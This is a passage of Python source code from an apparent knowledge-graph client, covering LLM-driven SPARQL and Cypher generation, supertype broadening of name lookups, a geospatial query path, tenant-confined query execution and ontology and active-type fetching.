                model=self._query_model,
                provider="cerebras",
                response_model=(data.get("model") if isinstance(data, dict) else None)
                or "",
            )

    async def _generate_cypher_via_anthropic(self, prompt: str) -> dict:
        msg = await self.anthropic.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=2048,
            system=CYPHER_GENERATION_SYSTEM,
            messages=[{"role": "user", "content": prompt}],
        )
        text = msg.content[0].text if msg.content else "{}"
        text = text.strip()
        if text.startswith("```"):
            text = re.sub(r"^```(?:json)?\s*", "", text)
            text = re.sub(r"\s*```$", "", text)
        if not text:
            raise EmptyLLMResponse("anthropic", finish_reason="stop")
        parsed = json.loads(text)
        if "cypher" not in parsed and "sparql" in parsed:
            parsed["cypher"] = parsed["sparql"]
        usage = None
        if getattr(msg, "usage", None) is not None:
            usage = {
                "prompt_tokens": getattr(msg.usage, "input_tokens", None),
                "completion_tokens": getattr(msg.usage, "output_tokens", None),
            }
        return attach_usage(
            parsed,
            usage=usage,
            model="claude-sonnet-4-20250514",
            provider="anthropic",
        )

    # ------------------------------------------------ name-lookup broadening
    # Match a `types/<Leaf>` URI in rdf:type OBJECT position, whether the
    # predicate is a bare rdf:type or the subclass-closure path the pipeline
    # rewrites it to (`<…#type>/<…#subClassOf>*`).
    _TYPE_OBJECT_RE = re.compile(
        r"#type>(?:\s*/\s*<[^>]*#subClassOf>\*)?\s*"
        rf"<({re.escape(IRI_BASE)}/types/[^>]+)>"
    )
    # Capture the variable a case-insensitive substring FILTER targets:
    # FILTER(CONTAINS(LCASE(?V), …)) — allowing an optional STR() coercion around
    # the variable. The generation prompt teaches this exact shape for BOTH name
    # matching AND arbitrary string-attribute filters (tags, status, …), so a bare
    # `CONTAINS(LCASE` match would over-trigger broadening; we additionally require
    # ?V to be a display-NAME variable (see :meth:`_targets_label_name_var`).
    _CONTAINS_VAR_RE = re.compile(
        r"CONTAINS\s*\(\s*LCASE\s*\(\s*(?:STR\s*\(\s*)?\?(\w+)", re.IGNORECASE
    )
    _RDFS_LABEL_URI = "http://www.w3.org/2000/01/rdf-schema#label"

    @classmethod
    def _targets_label_name_var(cls, sparql: str) -> bool:
        """True iff a ``CONTAINS(LCASE(?V))`` filter in the query targets a DISPLAY
        NAME variable — ``?V`` bound in the SAME query as the object of an
        ``rdfs:label`` triple or a ``types/<T>/attrs/{name,label}`` attribute
        triple.

        A ``CONTAINS`` over an arbitrary string attribute (``tags``, ``status``, …)
        returns ``False``. Without this gate, broadening would widen a
        legitimately type-constrained attribute query (e.g. a ``MortgageComplaint``
        filtered on ``attrs/tags`` that returns zero rows) up to the supertype and
        surface a sibling-subtype row — turning an honest "no results" into a
        confidently wrong-TYPE answer.
        """
        for m in cls._CONTAINS_VAR_RE.finditer(sparql):
            v = re.escape(m.group(1))
            if re.search(rf"<{re.escape(cls._RDFS_LABEL_URI)}>\s*\?{v}\b", sparql):
                return True
            if re.search(
                rf"<{re.escape(IRI_BASE)}/types/[^>]+/attrs/(?:name|label)>\s*\?{v}\b",
                sparql,
                re.IGNORECASE,
            ):
                return True
        return False

    async def _broaden_name_lookup(
        self,
        sparql: str,
        graph_uri: str,
        data_graph: str | None = None,
        layer_graph_uris: list[str] | None = None,
    ) -> tuple[str, dict] | None:
        """Retry a zero-row NAME lookup against the type's SUPERTYPE.

        A lookup by name that the generator bound to ONE specific subtype (e.g. a
        person queried as ``OrthopedicSurgeon`` who is actually a
        ``BreastOncologist``) returns zero rows, even though the shared supertype
        (``Physician``) spans every subtype. When the executed query is (a) a
        DISPLAY-NAME lookup — a ``FILTER(CONTAINS(LCASE(?V)))`` whose ``?V`` is
        bound as an ``rdfs:label`` / name attribute (NOT an arbitrary string
        attribute like ``tags``; see :meth:`_targets_label_name_var`) — and (b)
        constrains ``rdf:type`` to EXACTLY ONE ``types/<Sub>`` that HAS a
        supertype, re-issue it with that subtype swapped for its top-most
        ancestor. The subclass-closure rewrite (``rdf:type/subClassOf*``) already
        applied to the query then makes the ancestor match every sibling subtype.

        Returns ``(broadened_sparql, raw_result)`` from the re-query, or ``None``
        when the query is not a single-subtype NAME lookup, the type has no
        supertype, or anything errors — best-effort. The one exception it lets
        through is :class:`CrossTenantQueryError` (ONTA-424): swallowing a
        confinement failure into ``None`` would turn a security event into a
        silent "no broadening happened", so it propagates to ``ask()``, which
        re-raises it.
        """
        try:
            if not self._targets_label_name_var(sparql):
                return None
            type_uris = set(self._TYPE_OBJECT_RE.findall(sparql))
            if len(type_uris) != 1:
                return None
            sub_uri = next(iter(type_uris))
            sub_name = sub_uri.rsplit("/", 1)[-1]

            parent_of = await self._fetch_parent_map(graph_uri)
            if sub_name not in parent_of:
                return None
            # Walk to the top-most ancestor so the broadened query spans the whole
            # hierarchy, not just one level up. Guard against cyclic subClassOf.
            ancestor = sub_name
            seen = {ancestor}
            while parent_of.get(ancestor) and parent_of[ancestor] not in seen:
                ancestor = parent_of[ancestor]
                seen.add(ancestor)
            if ancestor == sub_name:
                return None

            from infona_client.graph.ontology_queries import type_uri as _type_uri
            super_uri = _type_uri(ancestor)
            # Replace ONLY the exact bracketed type-object, never a raw substring:
            # a bare `sparql.replace(sub_uri, super_uri)` would corrupt every URI
            # that shares the prefix — `types/Cat/attrs/breed` → the non-existent
            # `types/Animal/attrs/breed`, and sibling `types/CatFood` →
            # `types/AnimalFood` — breaking a "show details" query that projects
            # type-specific attribute URIs.
            broadened = sparql.replace(f"<{sub_uri}>", f"<{super_uri}>")
            if broadened == sparql:
                return None
            # ONTA-424: re-confine rather than inherit the caller's verdict. The
            # substitution above only rewrites a `types/` URI today, so the
            # dataset cannot change, but the guard belongs at the store call and
            # not at whichever transform happens to precede it.
            broadened = self._confine_generated(
                broadened, data_graph or graph_uri, layer_graph_uris
            )
            raw = await self.neptune.query(broadened)
            return broadened, raw
        except CrossTenantQueryError:
            raise
        except Exception:
            logger.debug("name_lookup_broaden_failed", exc_info=True)
            return None

    async def _fetch_parent_map(self, graph_uri: str) -> dict[str, str]:
        """child_name -> parent_name from the graph's ``rdfs:subClassOf`` edges.

        Best-effort; used only on the zero-row broadening path. Keys/values are
        the type NAMES (last URI path segment), so callers walk the hierarchy by
        name.
        """
        from infona_client.graph.ontology_queries import parent_map_query
        TYPES = TYPE_URI_PREFIX
        raw = await self.neptune.query(parent_map_query(graph_uri))
        _, bindings = parse_sparql_results(raw)
        parent_of: dict[str, str] = {}
        for row in bindings:
            child = row.get("child", "")
            parent = row.get("parent", "")
            if child.startswith(TYPES) and parent.startswith(TYPES):
                parent_of[child[len(TYPES):]] = parent[len(TYPES):]
        return parent_of

    # ------------------------------------------------------------- spatial path
    async def _try_spatial_fast_path(
        self,
        question: str,
        ontology: str,
        data_graph: str,
        timing: dict,
        t0: float,
    ) -> NLResult | None:
        """Answer a geo/proximity question directly from the spatio-temporal index.

        Returns an ``NLResult`` on success, or ``None`` to fall through to the
        normal SPARQL path — when the graph isn't a per-KG instance graph, the LLM
        doesn't return a servable spatial intent, the anchor can't be resolved, or
        anything errors. Never raises into :meth:`ask` (best-effort fast path).
        """
        scope = parse_kg_graph_uri(data_graph)
        if scope is None:
            return None  # index rows are scoped per (tenant, kg); can't route otherwise
        tenant_id, kg_name = scope
        try:
            ts = time.time()
            raw = await self._detect_spatial_intent(question, ontology)
            intent = parse_spatial_intent(raw) if raw else None
            timing["spatial_intent_ms"] = round((time.time() - ts) * 1000, 1)
            if intent is None:
                return None

            from infona_client.spatiotemporal.registry import get_spatiotemporal_index

            index = get_spatiotemporal_index()

            # Temporal predicate: a single instant (as_of) wins over a window.
            as_of = _parse_iso_dt(intent.as_of)
            window = None
            if as_of is None and (intent.time_from or intent.time_to):
                window = (_parse_iso_dt(intent.time_from), _parse_iso_dt(intent.time_to))

            tq = time.time()
            if intent.kind == "radius":
                coords = await self._resolve_anchor_coords(intent.anchor, data_graph)
                if coords is None:
                    return None  # "near X" but X didn't resolve → fall through
                lon, lat = coords
                hits = await index.query_radius(
                    tenant_id, lon, lat, intent.radius_m,
                    kg_name=kg_name, time_window=window, as_of=as_of,
                )
            else:  # bbox
                min_lon, min_lat, max_lon, max_lat = intent.bbox
                hits = await index.query_bbox(
                    tenant_id, min_lon, min_lat, max_lon, max_lat,
                    kg_name=kg_name, time_window=window, as_of=as_of,
                )
            timing["spatial_index_ms"] = round((time.time() - tq) * 1000, 1)

            hits = filter_by_type(hits, intent.target_type)
            answer = format_spatial_answer(hits, intent)
            timing["spatial_routed"] = "true"
            timing["total_ms"] = round((time.time() - t0) * 1000, 1)
            return NLResult(
                answer=answer,
                sparql="",
                explanation="Answered from the spatio-temporal index (no SPARQL).",
                ontology=ontology,
                narrative_answer=answer,
                functions_invoked=[],
                timing=timing,
            )
        except Exception:
            logger.warning("spatial_fast_path_failed", exc_info=True)
            return None

    async def _detect_spatial_intent(self, question: str, ontology: str) -> dict | None:
        """LLM classify: is this a servable spatial lookup, and with what params?
        Returns the raw JSON dict (caller parses) or None on error."""
        user = (
            f"Question: {question}\n\n"
            f"Knowledge-graph types/attributes (for the target type, if any):\n"
            f"{ontology[:2000]}"
        )
        try:
            return await self._structured_llm(
                SPATIAL_INTENT_SYSTEM, user, "spatial_intent", SPATIAL_INTENT_SCHEMA
            )
        except Exception:
            logger.warning("spatial_intent_detect_failed", exc_info=True)
            return None

    async def _resolve_anchor_coords(self, anchor, data_graph: str):
        """Resolve a radius anchor to ``(lon, lat)``.

        Resolution ladder (first hit wins):
          1. explicit coordinates on the intent;
          2. a KG entity whose label matches ``entity_description`` AND carries a
             ``geo:wktLiteral`` (one scoped Neptune lookup) — preferred, since it
             pins the anchor to the tenant's own data;
          3. the free-text GEOCODER seam (ONTA-249): turn a bare place name
             ("Irvine") into coords via the registered geocoder — the OSS default
             is a deterministic offline gazetteer; a premium geocoder registers
             over it. This is what lets a place name resolve when no KG entity for
             it exists.

        Returns ``None`` when nothing resolves — the caller then falls through to
        the normal SPARQL path (byte-stable pre-existing behavior)."""
        if anchor is None:
            return None
        if anchor.has_coords():
            return (anchor.lon, anchor.lat)
        if not anchor.entity_description:
            return None
        # 2. KG-entity geometry (preferred — anchored to the tenant's own data).
        via_kg = await self._resolve_anchor_via_neptune(
            anchor.entity_description, data_graph
        )
        if via_kg is not None:
            return via_kg
        # 3. Free-text geocoder seam.
        return await self._geocode_anchor(anchor.entity_description)

    async def _geocode_anchor(self, description: str):
        """Resolve a free-text place name to ``(lon, lat)`` via the geocoder seam.

        Best-effort: returns ``None`` (never raises) when the place is unknown or
        the geocoder errors, so the caller falls through to the SPARQL path."""
        if not description or not description.strip():
            return None
        try:
            from infona_client.spatiotemporal.geocoder import get_geocoder

            coords = await get_geocoder().geocode(description)
        except Exception:
            logger.warning("geocode_anchor_failed", exc_info=True)
            return None
        if (
            isinstance(coords, tuple)
            and len(coords) == 2
            and all(isinstance(c, (int, float)) for c in coords)
        ):
            lon, lat = float(coords[0]), float(coords[1])
            if -180.0 <= lon <= 180.0 and -90.0 <= lat <= 90.0:
                return (lon, lat)
        return None

    async def _resolve_anchor_via_neptune(self, description: str, data_graph: str):
        """Find a KG entity whose label/text contains ``description`` AND that
        carries a ``geo:wktLiteral``; return that point's ``(lon, lat)`` or None.

        One scoped SELECT, LIMIT 1. The description is sanitized before it is
        interpolated into the FILTER literal."""
        desc = _sanitize_sparql_literal(description)
        for article in ("the ", "a ", "an "):
            if desc.startswith(article):
                desc = desc[len(article):]
        if not desc:
            return None
        anchor_query = (
            f"SELECT ?wkt FROM <{data_graph}> WHERE {{ "
            f"?e ?lp ?lbl . "
            f'FILTER(isLiteral(?lbl) && CONTAINS(LCASE(STR(?lbl)), "{desc}")) '
            f"?e ?gp ?wkt . "
            f"FILTER(datatype(?wkt) = <{_GEO_WKT_URI}>) "
            f"}} LIMIT 1"
        )
        try:
            raw = await self.neptune.query(anchor_query)
            _, rows = parse_sparql_results(raw)
        except Exception:
            logger.warning("anchor_resolve_failed", exc_info=True)
            return None
        if not rows:
            return None
        return _parse_point_wkt(rows[0].get("wkt", ""))

    async def _structured_llm(
        self, system: str, user: str, schema_name: str, schema: dict
    ) -> dict:
        """Provider-agnostic structured-JSON call for non-SPARQL classifiers (e.g.
        spatial-intent detection). Mirrors :meth:`_generate_sparql`'s provider
        selection but is a SEPARATE method on purpose — the SPARQL generators stay
        byte-identical so evals are unaffected."""
        if self._query_provider == "cerebras" and self._cerebras_key:
            endpoint = "https://api.cerebras.ai/v1/chat/completions"
            key, model = self._cerebras_key, self._query_model
        elif self._openrouter_key:
            endpoint = f"{OPENROUTER_BASE}/chat/completions"
            key, model = self._openrouter_key, self._query_model
        else:
            return await self._structured_via_anthropic(system, user, schema)
        assert_online_url(endpoint, purpose="query structured LLM")
        async with httpx.AsyncClient(timeout=30) as client:
            res = await client.post(
                endpoint,
                headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
                json={
                    "model": model,
                    "messages": [
                        {"role": "system", "content": system},
                        {"role": "user", "content": user},
                    ],
                    "temperature": 0,
                    "response_format": {
                        "type": "json_schema",
                        "json_schema": {"name": schema_name, "strict": True, "schema": schema},
                    },
                },
            )
            res.raise_for_status()
            text = _require_message_content(res.json(), self._query_provider).strip()
            if text.startswith("```"):
                text = "\n".join(
                    l for l in text.split("\n") if not l.strip().startswith("```")
                )
            return json.loads(text)

    async def _structured_via_anthropic(self, system: str, user: str, schema: dict) -> dict:
        from infona_client.offline import assert_online_host
        assert_online_host("api.anthropic.com", purpose="Anthropic structured LLM call")
        message = await self.anthropic.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=512,
            system=system,
            messages=[{"role": "user", "content": user}],
            output_config={"format": {"type": "json_schema", "schema": schema}},
        )
        return json.loads(message.content[0].text)

    async def select_entity_uris(
        self,
        description: str,
        type_name: str,
        graph_uri: str,
        instance_graph: str | None = None,
        limit: int | None = None,
    ) -> list[str]:
        """Resolve an NL subset description to the IRIs of ``type_name`` entities.

        Turns a ranked/specific subset — e.g. "the 5 brokers with the most
        property listings" — into the concrete entity IRIs it names, so a caller
        (the agent's enrich planner) can enrich exactly those via ``entity_uris``
        instead of the whole type.

        **ONTA-534:** the NL→SPARQL execution path is retired. This method no
        longer POSTs SPARQL at Neptune (hang / silent-empty risk under Neo4j).
        When a GraphStore is available it runs a Cypher projection of the same
        subset question; otherwise it raises :class:`SparqlAskPathRetired`.
        Callers that treat any failure as ``[]`` (e.g. enrich subset resolution)
        keep fail-closed semantics without enriching the whole type by accident.
        """
        data_graph = instance_graph or graph_uri
        store = self._graph_store
        if store is None:
            try:
                from infona_client.graph.store import get_graph_store

                store = get_graph_store()
            except Exception:
                store = None

        if store is None:
            raise SparqlAskPathRetired(
                "select_entity_uris NL→SPARQL was retired with the Neptune "
                "cutover (ONTA-534). Configure a GraphStore (Neo4j / Memory) "
                "for Cypher subset resolution, or pass entity_uris explicitly."
            )

        from infona_client.graph.queries import parse_kg_graph_uri
        from infona_client.graph.store import GraphScope
        from infona_client.nlp.cypher_generate import (
            ontology_from_graph_store,
            records_to_bindings,
            try_deterministic_cypher,
        )

        parsed = parse_kg_graph_uri(data_graph)
        if parsed:
            tenant_id, kg_name = parsed
        else:
            tenant_id = tenant_of_graph(data_graph) or ""
            kg_name = data_graph.rstrip("/").rsplit("/", 1)[-1] if data_graph else ""
        if not tenant_id or not kg_name:
            logger.warning(
                "select_entity_uris_bad_graph",
                data_graph=data_graph,
            )
            return []

        # 1) Deterministic Cypher fixtures for *internal* URI resolution only
        # (not user-facing /ask — that path is always LLM). Prefer a template
        # when the subset description matches a list/filter/hop shape.
        try:
            ontology, type_names = await ontology_from_graph_store(
                store, tenant_id=tenant_id, kg=kg_name
            )
            gen = try_deterministic_cypher(
                f"list {type_name}: {description}",
                ontology or "",
                type_names=type_names or [type_name],
            )
            if gen and gen.get("cypher"):
                params = dict(gen.get("params") or {})
                if limit is not None and "limit" in params:
                    params["limit"] = min(int(params["limit"]), int(limit))
                elif limit is not None:
                    params["limit"] = int(limit)
                cypher, forced = confine_generated_cypher(
                    gen["cypher"],
                    tenant_id=tenant_id,
                    kg=kg_name,
                    params=params,
                )
                session = store.session(GraphScope.for_instance(tenant_id, kg_name))
                records, _path = await self._execute_confined_cypher(
                    session, gen, cypher, forced
                )
                _vars, bindings = records_to_bindings(records)
                uris = self._entity_uris_from_bindings(bindings, limit)
                if uris:
                    return uris
        except Exception:
            logger.warning("select_entity_uris_deterministic_failed", exc_info=True)

        # 2) Full Cypher NL path — extract IRIs from the answer when present.
        cap = f" Return at most {int(limit)} rows." if limit else ""
        question = (
            f"Return ONLY the entity id/IRI of each {type_name} entity in this set: "
            f"{description}. Project a single identifier column (id or uri) for "
            f"each {type_name}. Apply any ranking/ordering and limit the set "
            f"describes; do not aggregate the id away or replace it with a label only."
            f"{cap}"
        )
        try:
            result = await self._ask_cypher(
                question,
                graph_uri=graph_uri,
                data_graph=data_graph,
            )
            uris = self._entity_uris_from_answer_text(result.answer, limit)
            if uris:
                return uris
        except Exception:
            logger.warning("select_entity_uris_cypher_failed", exc_info=True)

        # Fail closed: never hit residual SPARQL / dead Neptune HTTP.
        logger.warning(
            "select_entity_uris_unresolved",
            type_name=type_name,
            description=(description or "")[:120],
        )
        return []

    @staticmethod
    def _entity_uris_from_answer_text(
        answer: str, limit: int | None = None
    ) -> list[str]:
        """Best-effort scrape of entity IRIs from an NL answer string."""
        if not answer:
            return []
        found = re.findall(r"https?://[^\s\"'<>]+", answer)
        out: list[str] = []
        seen: set[str] = set()
        for u in found:
            u = u.rstrip(".,);]")
            if u in seen:
                continue
            seen.add(u)
            out.append(u)
            if limit is not None and len(out) >= int(limit):
                break
        return out

    @staticmethod
    def _entity_uris_from_bindings(
        bindings: list[dict], limit: int | None = None
    ) -> list[str]:
        """Pull entity IRIs out of result bindings, order-preserving and deduped.

        Prefers the ``?uri`` / ``id`` column the resolver prompt asks for; if a
        row lacks it, falls back to the first http(s)-IRI value in that row.
        Caps at ``limit`` when given.
        """
        out: list[str] = []
        seen: set[str] = set()

        def _is_iri(v: object) -> bool:
            return isinstance(v, str) and v.startswith(("http://", "https://"))

        for row in bindings:
            val = row.get("uri") or row.get("id") or row.get("entity_id")
            if not isinstance(val, str) or not val:
                val = next((v for v in row.values() if _is_iri(v)), None)
            if not isinstance(val, str) or not val:
                continue
            if val in seen:
                continue
            seen.add(val)
            out.append(val)
            if limit is not None and len(out) >= int(limit):
                break
        return out

    # ── Active-type probe (ONTA-427) ──────────────────────────────────────── #
    # `active_types` decides which DECLARED types get the "[no instances]" mark
    # (ONTA-258). Getting it wrong in the FALSE-EMPTY direction (a populated type
    # marked empty) is the regression that matters: the model would then tell the
    # user a type has no data when it does. Everything below is written to make
    # the probe cheap WITHOUT ever risking that: a probe that cannot answer
    # confidently returns None and the caller falls back to the full scan.

    @staticmethod
    def _active_type_candidate_uris(type_names: Iterable[str]) -> list[str]:
        """Every type URI an instance of each declared name could plausibly carry.

        The pre-ONTA-427 scan matched instance types to declared types by NAME
        (``type_name_from_uri``), which is namespace-agnostic: an instance typed
        ``types/public/Person`` marked a tenant-declared ``Person`` active.
        Probing only the DECLARING layer's URI would silently turn such a type
        into a false "[no instances]", so we probe every layer namespace for the
        name (three URIs, deduped, order-preserving). That keeps the bounded
        probe's answer identical to the scan's while staying O(declared types).
        """
        from infona_client.graph.layers import Layer, layer_type_uri

        uris: list[str] = []
        seen: set[str] = set()
        for name in type_names:
            for layer in Layer:
                u = layer_type_uri(layer, name)
                if u not in seen:
                    seen.add(u)
                    uris.append(u)
        return uris

    @staticmethod
    def _active_type_probe_query(instance_graph: str, uris: list[str]) -> str:
        """One LIMIT-1 existence subselect per candidate type URI, UNIONed.

        READ-ONLY (a SELECT). Each subselect is a first-match seek on the
        (predicate, object) index, so the engine can stop at the first instance
        of that type instead of scanning every rdf:type triple in the graph.
        """
        blocks = " UNION ".join(
            f"{{ SELECT (<{u}> AS ?type) WHERE {{ ?s <{RDF_TYPE_URI}> <{u}> }} LIMIT 1 }}"
            for u in uris
        )
        return f"SELECT DISTINCT ?type FROM <{instance_graph}> WHERE {{ {blocks} }}"

    async def _probe_active_types(
        self, instance_graph: str, candidate_uris: list[str]
    ) -> set[str] | None:
        """Which of ``candidate_uris`` have at least one instance? (bounded)

        Returns the set of type NAMES found, or ``None`` when the probe could not
        be completed. ANY chunk failing invalidates the WHOLE result, because a
        partial answer would mark the missing chunk's types "[no instances]"
        (the exact ONTA-258 regression). ``None`` tells the caller to fall back to
        the unbounded scan, i.e. to the pre-ONTA-427 behavior, so a Neptune that
        dislikes this query shape degrades in cost, never in correctness.

        Chunks run concurrently under a semaphore, so the fan-out is bounded by
        MAX_ACTIVE_TYPE_PROBE_CONCURRENCY regardless of how many types the KG
        declares (the same treatment enum discovery gets, COG-58).
        """
        import asyncio

        from infona_client.graph.layers import type_name_from_uri

        chunks = [
            candidate_uris[i : i + ACTIVE_TYPE_PROBE_CHUNK]
            for i in range(0, len(candidate_uris), ACTIVE_TYPE_PROBE_CHUNK)
        ]
        sem = asyncio.Semaphore(MAX_ACTIVE_TYPE_PROBE_CONCURRENCY)

        async def _one(chunk: list[str]):
            async with sem:
                return await self.neptune.query(
                    self._active_type_probe_query(instance_graph, chunk)
                )

        # return_exceptions=True so a failing chunk cannot leave its siblings'
        # results unretrieved; the failure is then treated as a whole-probe
        # failure below, never as a partial answer.
        raws = await asyncio.gather(
            *[_one(chunk) for chunk in chunks], return_exceptions=True
        )
        if any(isinstance(r, BaseException) for r in raws):
            first = next(r for r in raws if isinstance(r, BaseException))
            logger.warning(
                "active_types_probe_failed",
                instance_graph=instance_graph,
                candidates=len(candidate_uris),
                error=str(first),
            )
            return None

        found: set[str] = set()
        for raw in raws:
            _, rows = parse_sparql_results(raw)
            for row in rows:
                name = type_name_from_uri(row.get("type", ""))
                if name:
                    found.add(name)
        return found

    async def _scan_instance_types(self, instance_graph: str) -> set[str]:
        """Every type NAME present in the instance graph (the UNBOUNDED scan).

        The pre-ONTA-427 probe verbatim. Still the right tool for the two jobs
        that genuinely need types the ontology never declared: the schema-missing
        instance fallback, and the over-cap case where one scan beats hundreds of
        seeks. READ-ONLY (a SELECT).
        """
        from infona_client.graph.layers import type_name_from_uri

        # Named for what it is, not `query`: the confinement drift guard in
        # tests/test_generated_sparql_scoping.py is deny-by-default and a
        # generically-named local would have to be allowlisted, which would then
        # wave through the next generated query that happened to reuse the name.
        type_scan_query = (
            f"SELECT DISTINCT ?type FROM <{instance_graph}> "
            f"WHERE {{ ?s <{RDF_TYPE_URI}> ?type }}"
        )
        _, rows = parse_sparql_results(await self.neptune.query(type_scan_query))
        out: set[str] = set()
        for row in rows:
            # type_name_from_uri understands tenant / public / enhanced
            # namespaces (longest-prefix-first), so a bare strip of the tenant
            # prefix would turn types/public/Person into "public/Person".
            name = type_name_from_uri(row.get("type", ""))
            if name:
                out.add(name)
        return out

    async def _resolve_active_types(
        self, instance_graph: str, declared_names=None
    ) -> tuple[set[str], set[str] | None]:
        """Active type names, plus the scan result when a scan was what produced them.

        The ONE place the ONTA-427 ladder lives, shared by the two callers that
        need it (:meth:`_active_types` for the semantic path, :meth:`_fetch_ontology`
        for the full one) so they cannot drift into asking the same question two
        different ways. Bounded LIMIT-1 probe when the declared names are known and
        there are few enough of them; the unbounded scan otherwise, or when the
        probe could not answer. The second element is the scan's own result (or
        None), so a caller that ALSO needs types the ontology never declared can
        reuse it instead of scanning twice.
        """
        names: set[str] | None = None
        if declared_names:
            candidate_uris = self._active_type_candidate_uris(declared_names)
            if candidate_uris and len(candidate_uris) <= MAX_ACTIVE_TYPE_PROBE_URIS:
                names = await self._probe_active_types(instance_graph, candidate_uris)
        scanned: set[str] | None = None
        if names is None:
            # Nothing declared, too many candidates to probe cheaply, or the
            # probe failed. Fall back to the pre-ONTA-427 scan.
            scanned = await self._scan_instance_types(instance_graph)
            names = scanned
        return names, scanned

    async def _active_types(
        self,
        instance_graph: str | None,
        ontology_graph: str = "",
        declared_names=None,
    ) -> set[str] | None:
        """Type names that actually carry instances in ``instance_graph``.

        Hoisted out of :meth:`_fetch_ontology` (ONTA-411) because the SEMANTIC
        retrieval path needs the same scope signal: the ontology store is
        tenant-wide, the instance graph is per-KG, and without this set a
        question retrieves a sibling KG's schema at max cosine similarity.

        ``declared_names`` keeps the probe on ONTA-427's bounded path. The
        semantic caller has no schema read to draw them from, so it passes the
        embedding store's own type names, which ARE the tenant's declared types;
        without them this would fall back to the unbounded per-ask scan that
        ONTA-427 removed.

        Returns ``None`` when there is nothing to scope: no instance graph, or
        the instance graph IS the ontology graph, in which case every declared
        type is in scope by definition. TTL-cached per instance graph AND
        candidate set (see :func:`_active_types_cache_key`); raises on
        a probe failure so each caller applies its own degradation policy
        (:meth:`_fetch_ontology` keeps reporting ONTOLOGY_FETCH_ERROR, while
        :meth:`ask` degrades to unscoped retrieval).

        An EMPTY result is deliberately NOT served from the cache. Downstream,
        `_fetch_ontology` treats "no declared type carries instances" as the
        fresh-ingest disambiguation branch and returns ONTOLOGY_EMPTY WITHOUT
        caching the summary, precisely so the next ask re-reads a KG that may
        have been populated in the meantime. Caching the empty probe would
        reinstate the stale answer that branch exists to avoid: a KG asked about
        while empty, then ingested by another worker, would keep answering
        "No ontology defined yet." for the rest of the TTL. Re-probing an empty
        graph is also the cheapest possible query.
        """
        if not instance_graph or instance_graph == ontology_graph:
            return None
        key = _active_types_cache_key(instance_graph, declared_names)
        cached = _active_types_cache.get(key)
        if cached and cached[0] and (time.time() - cached[1]) < ONTOLOGY_CACHE_TTL:
            return cached[0]
        names, _ = await self._resolve_active_types(instance_graph, declared_names)
        _store_active_types(key, names)
        return names

    async def _fetch_ontology(
        self,
        graph_uri: str,
        instance_graph: str | None = None,
        layer_graph_uris: list[str] | None = None,
    ) -> str:
        # Cache key includes instance graph + layer stack so different KGs and
        # entitlement shapes get the correct filtered ontology (ONTA-397).
        layers_key = ",".join(layer_graph_uris or ())
        cache_key = f"{graph_uri}|{instance_graph or ''}|{layers_key}"
        cached = _ontology_cache.get(cache_key)
        if cached and (time.time() - cached[1]) < ONTOLOGY_CACHE_TTL:
            return cached[0]

        from infona_client.graph.layers import (
            Layer,
            enhanced_graph_uri,
            layer_type_uri,
            public_graph_uri,
            type_name_from_uri,
        )
        from infona_client.graph.ontology_queries import get_full_ontology_query, type_uri, attr_uri

        def _layer_for_graph(g: str) -> Layer:
            if g == public_graph_uri():
                return Layer.PUBLIC
            if g == enhanced_graph_uri():
                return Layer.ENHANCED
            return Layer.TENANT

        def _attr_uri_for(layer: Layer, type_name: str, attr_name: str) -> str:
            if layer is Layer.TENANT:
                return attr_uri(type_name, attr_name)
            return f"{layer_type_uri(layer, type_name)}/attrs/{attr_name}"

        def _type_uri_for(layer: Layer, type_name: str) -> str:
            if layer is Layer.TENANT:
                return type_uri(type_name)
            return layer_type_uri(layer, type_name)

        try:
            # Which types actually have instances is resolved AFTER the schema
            # read below (ONTA-427). The declared type list is what makes the
            # cheap, bounded form of that question possible.
            active_types: set[str] | None = None
            # Populated only if we end up running the UNBOUNDED scan, so the
            # schema-missing fallback further down can reuse it instead of
            # scanning the instance graph a second time.
            scanned_instance_types: set[str] | None = None

            # Graphs in precedence order (first wins under shadowing). When no
            # layer stack is threaded, behaviour is exactly the pre-ONTA-397
            # single tenant-graph read.
            ontology_graphs = list(layer_graph_uris) if layer_graph_uris else [graph_uri]

            types: dict[str, dict] = {}
            type_layers: dict[str, Layer] = {}
            for onto_g in ontology_graphs:
                layer = _layer_for_graph(onto_g)
                try:
                    raw = await self.neptune.query(get_full_ontology_query(onto_g))
                    _, bindings = parse_sparql_results(raw)
                except Exception:
                    # Per-layer degradation (ADR 0002 §1): a missing/erroring
                    # global layer contributes nothing; others still load.
                    logger.warning(
                        "layer_ontology_fetch_failed",
                        graph_uri=onto_g,
                        layer=layer.value,
                        exc_info=True,
                    )
                    continue
                for row in bindings:
                    tl = row.get("typeLabel", "")
                    if not tl:
                        continue
                    # Fail SOFT on a corrupt stored label (ONTA-425). This whole
                    # block sits under one `except Exception: return
                    # ONTOLOGY_FETCH_ERROR`, so letting `_type_uri_for` /
                    # `_attr_uri_for` raise on ONE bad name would replace the
                    # ENTIRE schema summary with "ontology unavailable" for every
                    # NL query in the workspace — the infona-oss#274 all-or-nothing
                    # failure, on the hottest read path there is. One unqueryable
                    # type is the honest cost; a blinded planner is not.
                    if skip_invalid_type_name(tl, "ask_ontology_summary"):
                        continue
                    # NOTE: we no longer drop a declared type that is absent from
                    # `active_types` here (ONTA-258). Every declared type is parsed
                    # in; types with no instances in the queried KG are annotated
                    # "[no instances]" during summary assembly below instead of being
                    # hidden. See the empty-type handling after this loop.
                    #
                    # Shadowing (ONTA-397): the first visible layer that defines
                    # this name wins; later layers' definitions are skipped.
                    if tl not in types:
                        types[tl] = {
                            "attributes": [],
                            "relationships": [],
                            "functions": set(),
                        }
                        type_layers[tl] = layer
                    elif type_layers.get(tl) is not layer:
                        # Already claimed by a higher-precedence layer.
                        continue
                    # Same fail-soft rule for the ATTRIBUTE half: its label is
                    # equally a stored literal, and `_attr_uri_for` mints an IRI
                    # from it below. Skipping only the attribute (not the whole
                    # row) keeps the row's function binding.
                    if row.get("attrLabel") and not skip_invalid_type_name(
                        row["attrLabel"], "ask_ontology_attr"
                    ):
                        attr_name = row["attrLabel"]
                        range_str = row.get("range", "")
                        target_type = type_name_from_uri(range_str) if range_str else None
                        if target_type:
                            # Relationship predicates use onto/ namespace in instance data
                            onto_uri = f"{IRI_BASE}/onto/{attr_name}"
                            entry = f"{attr_name} → {target_type} — predicate URI: <{onto_uri}>"
                            if entry not in types[tl]["relationships"]:
                                types[tl]["relationships"].append(entry)
                        else:
                            dtype = range_str.split("#")[-1] if "#" in range_str else "string"
